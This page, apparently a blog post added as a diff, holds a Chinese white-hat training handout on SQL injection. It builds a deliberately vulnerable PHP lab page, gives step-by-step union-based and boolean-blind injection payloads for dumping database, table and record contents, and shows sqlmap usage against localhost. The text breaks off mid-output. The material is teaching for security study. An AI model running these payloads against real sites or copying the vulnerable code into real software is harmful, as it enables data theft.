@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Velpro_Q&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Velpro_Q&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title"></h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 4, 2019&nbsp;&nbsp;19:00:32</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="米斯特白帽培训讲义-漏洞篇-SQL-注入"><a href="#米斯特白帽培训讲义-漏洞篇-SQL-注入" class="headerlink" title="米斯特白帽培训讲义 漏洞篇 SQL 注入"></a>米斯特白帽培训讲义 漏洞篇 SQL 注入</h1><blockquote>
+<p>讲师：<a href="https://www.zhihu.com/people/gh0stkey/answers" target="_blank" rel="noopener">gh0stkey</a></p>
+</blockquote>
+<blockquote>
+<p>整理：<a href="https://github.com/" target="_blank" rel="noopener">飞龙</a></p>
+</blockquote>
+<blockquote>
+<p>协议：<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></p>
+</blockquote>
+<h2 id="原理与危害"><a href="#原理与危害" class="headerlink" title="原理与危害"></a>原理与危害</h2><p>SQL 注入就是指，在输入的字符串中注入 SQL 语句，如果应用相信用户的输入而对输入的字符串没进行任何的过滤处理，那么这些注入进去的 SQL 语句就会被数据库误认为是正常的 SQL 语句而被执行。</p>
+<p>恶意使用 SQL 注入攻击的人可以通过构建不同的 SQL 语句进行脱裤、命令执行、写 Webshell、读取度武器敏感系统文件等恶意行为。</p>
+<p><img src="http://ww3.sinaimg.cn/large/841aea59jw1fav3np94knj20i705dgm1.jpg" alt></p>
+<p>以上来自乌云的案例，都是利用 SQL 注入所造成的一系列危害。</p>
+<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>首先来看这一段代码（视频中不是这段代码，因为其更适合讲解，所以用这段代码）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$un = @$_POST[<span class="string">'un'</span>];</span><br><span class="line">$pw = @$_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from user where un='$un' and pw='$pw'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到代码首先从 HTTP 主体取得<code>un</code>和<code>pw</code>两个参数，这两个参数显然未加过滤。之后代码将其拼接到 SQL 语句中。</p>
+<p>如果恶意用户将<code>un</code>指定为任意正常内容，<code>pw</code>为非正常内容，那么就有被攻击的风险。比如我们将<code>un</code>赋为<code>admin</code>，<code>pw</code>赋为<code>&#39; or &#39;1&#39;=&#39;1</code>。则整个 SQL 语句会变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> un=<span class="string">'admin'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>where</code>子句对于任何用户都是恒成立的。那么我们就成功绕过了它的身份验证。</p>
+<h2 id="环境搭建（补充）"><a href="#环境搭建（补充）" class="headerlink" title="环境搭建（补充）"></a>环境搭建（补充）</h2><p>视频中的程序我找不到，所以还是自己搭个靶场演示吧，但是步骤是一样的。关于数据库环境我想说一下，不同数据库使用不同的配置和 SQL 方言，一个数据库上有用的方法不一定能用在另一个数据库上。但是，目前 70% 的网站都使用 MySQL，所以这篇讲义只会涉及 MySQL。</p>
+<p>大家可以下载 DVWA 在本地建立实验环境，如果觉得麻烦，可以自己写个脚本来建立。这里教给大家如何在本地建立实验环境。</p>
+<p>首先要在任意数据库创建一张表，插入一些数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> sqlinj;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> sqlinj (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">    info <span class="built_in">varchar</span>(<span class="number">32</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sqlinj <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">"item #1"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们创建了<code>sqlinj</code>表，并插入了一条数据。其实插入一条数据就够了，足以查看显示效果。</p>
+<p>之后我们将以下内容保存为<code>sql.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"GET"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">    ID：</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"id"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"查询"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 改成自己机子上的配置：</span></span><br><span class="line">$host = <span class="string">''</span>;</span><br><span class="line">$port = <span class="number">3306</span>;</span><br><span class="line">$un = <span class="string">''</span>;</span><br><span class="line">$pw = <span class="string">''</span>;</span><br><span class="line">$db = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">$id = @$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>($id == <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">$conn = @mysql_connect($host . <span class="string">':'</span> . $port, $un, $pw);</span><br><span class="line"><span class="keyword">if</span>(!$conn)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'数据库连接错误：'</span> . mysql_error());</span><br><span class="line">mysql_select_db($db, $conn);</span><br><span class="line">$sql = <span class="string">"select id, info from sqlinj where id=$id"</span>;</span><br><span class="line">$res = mysql_query($sql, $conn);</span><br><span class="line"><span class="keyword">if</span>(!$res)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'数据库错误：'</span>. mysql_error());</span><br><span class="line">$num = mysql_num_rows($res);</span><br><span class="line"><span class="keyword">if</span>($num == <span class="number">0</span>)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;ID：$id&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;无此记录&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $row = mysql_fetch_row($res);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;ID：$id&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Info：$&#123;row[1]&#125;&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($conn);</span><br></pre></td></tr></table></figure>
+
+<p>在文件目录下执行<code>php -S 0.0.0.0:80</code>，然后访问<code>http://localhost/sql.php</code>，然后就可以进行各种操作了。</p>
+<h2 id="手工注入：基于回显"><a href="#手工注入：基于回显" class="headerlink" title="手工注入：基于回显"></a>手工注入：基于回显</h2><p>基于回显的意思就是页面中存在显示数据库中信息的地方，通过注入我们就能把我们要查询的东西显示在页面上。一般页面中显示相关信息（比如帖子标题、内容）就能认为是基于回显的。</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>我们将<code>id</code>设为<code>1 and 1=1</code>，发现正常显示。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-9b87a22b311bf64f.jpg" alt></p>
+<p>将<code>id</code>设为<code>1 and 1=2</code>，显示“无此记录”。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-71ee355e766608cf.jpg" alt></p>
+<p>那么这里就很可能出现注入点。</p>
+<h3 id="判断列数量"><a href="#判断列数量" class="headerlink" title="判断列数量"></a>判断列数量</h3><p>我们下一步需要判断查询结果的列数量，以便之后使用<code>union</code>语句。我们构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by ?</span><br></pre></td></tr></table></figure>
+
+<p>其中问号处替换为从 1 开始的数字，一个一个尝试它们。直到某个数字 N 报错，那么列数为 N - 1。</p>
+<p>例如我这里，先尝试 1，没有报错：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-697fddbefbf07505.jpg" alt></p>
+<p>尝试 2 也没有报错，然后尝试 3 的时候：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-28ff98db00e79068.jpg" alt></p>
+<p>出现了错误，说明列数是 2。</p>
+<h3 id="确定显示的列"><a href="#确定显示的列" class="headerlink" title="确定显示的列"></a>确定显示的列</h3><p>我们可以构造语句了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,2</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-d045e2d8892d7ea8.jpg" alt></p>
+<p>显示位置为 2 号位，而且只有一个显示位置。</p>
+<h3 id="查询用户及数据库名称"><a href="#查询用户及数据库名称" class="headerlink" title="查询用户及数据库名称"></a>查询用户及数据库名称</h3><p>在 MySQL 中，<code>current_user</code>函数显示用户名称，<code>database</code>函数显示当前数据库名称。这里只有一个显示位置，为了方便起见，我们可以使用<code>concat</code>函数一次性显示出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,concat(current_user(),&apos; &apos;,database())</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-502df2943e0689c0.jpg" alt></p>
+<p>可以看到这里的用户名称是<code>root</code>，数据库名称是<code>test</code>。如果在真实场景下遇到，基本就可以断定是 root 权限了。</p>
+<h3 id="查询表的数量"><a href="#查询表的数量" class="headerlink" title="查询表的数量"></a>查询表的数量</h3><p>MySQL 中有一个数据库叫做<code>information_schema</code>，储存数据库和表的元信息。<code>information_schema</code>中有两个重要的表，一个叫<code>tables</code>，储存表的元信息，有两列特别重要，<code>table_schema</code>是所属数据库，<code>table_name</code>是表名称。另一个表示<code>columns</code>，储存列的源信息，<code>table_name</code>列是所属表名称，<code>column_name</code>列是列名称。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,count(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-0f19703943b0d628.jpg" alt></p>
+<p>这里我们使用<code>count</code>函数查询出了表的数量，一共七个。这里我们只查询当前数据库，如果要查询全部，可以把<code>where</code>子句给去掉。</p>
+<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p>因为它只能显示一条记录，我们使用<code>limit</code>子句来定位显示哪一条。<code>limit</code>子句格式为<code>limit m,n</code>，其中<code>m</code>是从零开始的起始位置，<code>n</code>是记录数。我们构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit ?,1</span><br></pre></td></tr></table></figure>
+
+<p>我们需要把问号处换成 0 ~ 6，一个一个尝试，七个表名称就出来了。比如，我们获取第一个表的名称。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-a2baf5dcdbb4c43a.jpg" alt></p>
+<p>它叫<code>email</code>，在真实场景下，这里面一般就是一部分用户信息了。如果第一个表示无关紧要的信息，可以继续寻找。</p>
+<h3 id="查询列数量"><a href="#查询列数量" class="headerlink" title="查询列数量"></a>查询列数量</h3><p>与表数量的查询类似，我们需要把所有<code>table</code>换成<code>column</code>。我们构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,count(column_name) from information_schema.columns where table_name=&apos;email&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-9535183e8fbfc067.jpg" alt></p>
+<p>一共有两个。</p>
+<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>我们把<code>count</code>去掉，加上<code>limit</code>，就出来了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,column_name from information_schema.columns where table_name=&apos;email&apos; limit ?,1</span><br></pre></td></tr></table></figure>
+
+<p>同样，我们需要把问号替换为 0 和 1；</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-fc29392755f102e5.jpg" alt></p>
+<p>我们这里查询结果为，第一列叫做<code>userid</code>，第二列叫做<code>email</code>。</p>
+<h3 id="查询行数量"><a href="#查询行数量" class="headerlink" title="查询行数量"></a>查询行数量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1, count(1) from email</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-ad87dad537ba05d2.jpg" alt></p>
+<h3 id="查询记录"><a href="#查询记录" class="headerlink" title="查询记录"></a>查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,concat(userid,&apos; &apos;,email) from email limit ?,1</span><br></pre></td></tr></table></figure>
+
+<p>我们把问号替换为 0 和 1，就得到了所有的数据。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-af910d42d4e22a9d.jpg" alt></p>
+<h2 id="手工注入：基于布尔值"><a href="#手工注入：基于布尔值" class="headerlink" title="手工注入：基于布尔值"></a>手工注入：基于布尔值</h2><p>在一些情况下，页面上是没有回显的。也就是说，不显示任何数据库中的信息。我们只能根据输出判断是否成功、失败、或者错误。这种情况就叫做盲注。</p>
+<p>比如说，我们把上面的代码改一下，倒数第三行改为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;存在此记录&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就不能通过<code>union</code>把它显示到页面上。所以我们需要一些盲注技巧。这种技巧之一就是基于布尔值，具体来说就是，如果我们想查询整数值，构造布尔语句直接爆破；如果想查询字符串值，先爆破它的长度，再爆破每一位。</p>
+<h3 id="查询用户及数据库名称-1"><a href="#查询用户及数据库名称-1" class="headerlink" title="查询用户及数据库名称"></a>查询用户及数据库名称</h3><p>基于布尔的注入中，判断注入点的原理是一样的。确定注入点之后我们直接查询用户及数据库名称（当然也可以跳过）。由于这种情况下所有查询都特别复杂，所以我们只选取其中一个，比如数据名称。</p>
+<p>首先爆破数据库名称的长度，我们构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select length(database()))=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处需要替换为数字，从 1 开始，直至出现正确的信息。为了简化操作，这里我们可以使用 Burp 了。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-1400808c47d2dc7b.jpg" alt></p>
+<p>它的长度为 4，这里我们再构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select substr(database(),$1,1))=$2</span><br></pre></td></tr></table></figure>
+
+<p>我们需要把<code>$1</code>替换成 1 ~ 4 的整数（<code>substr</code>从 1 开始），把<code>$2</code>替换成 a ~ z 、 0 ~ 9 以及<code>_</code>的 ASCLL 十六进制（SQL 不区分大小写）。这里我们最好把这些十六进制值存成一个列表，便于之后使用。</p>
+<p>之后开始爆破（类型选择<code>cluster bomb</code>，第一个 payload 选择<code>number</code>，第二个 payload 选择<code>preset lists</code>）：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-75b383b51f0df59f.jpg" alt></p>
+<p>我们通过查表得知，结果为<code>test</code>。</p>
+<h2 id="查询表的数量-1"><a href="#查询表的数量-1" class="headerlink" title="查询表的数量"></a>查询表的数量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(table_name) from information_schema.tables where table_schema=database())=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处替换为从一开始的数字。我们可以看到，数量为 7。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-eaf16f9dc4f7a32a.jpg" alt></p>
+<h2 id="查询表名-1"><a href="#查询表名-1" class="headerlink" title="查询表名"></a>查询表名</h2><p>我们这里演示如何查询第一个表的表名。</p>
+<p>首先查询表名长度。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处换成从 1 开始的整数。长度为 5：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-6bc29940612a9a8e.jpg" alt></p>
+<p>之后，再爆破每个字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select substr(table_name,$1,1) from information_schema.tables where table_schema=database() limit 0,1)=$2</span><br></pre></td></tr></table></figure>
+
+<p><code>$1</code>配置为 1 ~ 5的整数，<code>$2</code>的配置为上面的列表。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-edd202af6a30957b.jpg" alt></p>
+<p>查表可得，结果为<code>email</code>。</p>
+<h2 id="查询列数量-1"><a href="#查询列数量-1" class="headerlink" title="查询列数量"></a>查询列数量</h2><p>我们下面演示查询<code>email</code>表的列数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_name=&apos;email&apos;)=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处替换为从一开始的数字。我们可以看到，数量 2。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-835d83b4df9b7e5d.jpg" alt></p>
+<h2 id="查询列名称"><a href="#查询列名称" class="headerlink" title="查询列名称"></a>查询列名称</h2><p>作为演示，我这里查询第二列（<code>limit 1,1</code>）的名称。</p>
+<p>首先需要查询其长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select length(column_name) from information_schema.columns where table_name=&apos;email&apos; limit 1,1)=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处换成从 1 开始的整数。长度为 5：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-83611bd7189b880a.jpg" alt></p>
+<p>之后爆破每个字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select substr(column_name,$1,1) from information_schema.columns where table_name=&apos;email&apos; limit 1,1)=$2</span><br></pre></td></tr></table></figure>
+
+<p><code>$1</code>配置为 1 ~ 5的整数，<code>$2</code>的配置为上面的列表。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-b0cdf2a93255aa5e.jpg" alt></p>
+<p>结果是<code>email</code>。</p>
+<h2 id="查询行数量-1"><a href="#查询行数量-1" class="headerlink" title="查询行数量"></a>查询行数量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(1) from email)=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处替换为从一开始的数字。我们可以看到，数量为 2。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-5af57e4f3fdad21d.jpg" alt></p>
+<h2 id="查询记录-1"><a href="#查询记录-1" class="headerlink" title="查询记录"></a>查询记录</h2><p>我们这里演示如何查询第一条记录的<code>email</code>列。</p>
+<p>首先是长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select length(email) from email limit 0,1)=?</span><br></pre></td></tr></table></figure>
+
+<p>问号处替换为从一开始的数字。我们可以看到，长度为 17。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-e48ff0d2979531e3.jpg" alt></p>
+<p>之后爆破每个字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select substr(email,$1,1) from email limit 0,1)=$2</span><br></pre></td></tr></table></figure>
+
+<p><code>$1</code>配置为 1 ~ 17的整数，<code>$2</code>的配置为所有可见字符的十六进制 ascll 值（0x20 ~ 0x7e）。</p>
+<p>这个时间有些长，就不演示了。</p>
+<h2 id="SqlMap"><a href="#SqlMap" class="headerlink" title="SqlMap"></a>SqlMap</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>安装 Python 之后，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install sqlmap</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\asus&gt; sqlmap</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.1#pip&#125;</span><br><span class="line">|_ -| . [&apos;]     | .&apos;| . |</span><br><span class="line">|___|_  [&apos;]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">Usage: sqlmap [options]</span><br><span class="line"></span><br><span class="line">sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, -x, --wizard, --update, --purge-output or --dependencies), use -h for basic or -hh for advanced help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Press Enter to continue...</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>直接使用<code>-u</code>命令把 URL 给 SqlMap 会判断注入点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sql.php?id=</span><br></pre></td></tr></table></figure>
+
+<p>要注意这样 sqlmap 会判断所有的动态参数，要指定某个参数，使用<code>-p</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sql.php?id= -p id</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 12:05:40</span><br><span class="line"></span><br><span class="line">[12:05:40] [WARNING] provided value for parameter &apos;id&apos; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[12:05:40] [INFO] testing connection to the target URL</span><br><span class="line">[12:05:41] [INFO] heuristics detected web page charset &apos;utf-8&apos;</span><br><span class="line">[12:05:41] [INFO] testing if the target URL is stable</span><br><span class="line">[12:05:42] [INFO] target URL is stable</span><br><span class="line">[12:05:44] [INFO] heuristic (basic) test shows that GET parameter &apos;id&apos; might be injectable (possible DBMS: &apos;MySQL&apos;)</span><br><span class="line">[12:05:46] [INFO] testing for SQL injection on GET parameter &apos;id&apos;</span><br><span class="line">it looks like the back-end DBMS is &apos;MySQL&apos;. Do you want to skip test 